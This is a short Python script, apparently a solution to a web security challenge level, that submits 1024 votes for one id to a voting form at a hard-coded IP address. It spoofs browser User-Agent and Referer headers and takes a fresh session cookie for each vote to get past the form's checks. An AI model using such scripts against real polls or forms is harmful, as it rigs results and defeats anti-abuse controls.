'''Function votes for id 1024 times'''

import requests

''' Counter and total votes count '''
i = 0
votes = 1024

''' URL and form data '''
url = 'http://173.246.108.142/level2.php'
form = {
    'id': '38',
    'holdthedoor': 'Submit Query',
}

''' Header sets User-Agent to appear as thought the requests is from Firefox
 on Windows. Also sets the Referer to appear as if the request is coming from
 the page with the form '''
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0',
    'Referer': 'http://173.246.108.142/level2.php'
}

''' Loop to submit requests '''
while i < votes:
    s = requests.session()
    s.get(url, headers=header)
    form['key'] = s.cookies['HoldTheDoor']
    s.post(url, data=form, headers=header)
    s.close()
    i += 1
    print "Vote: " + str(i)
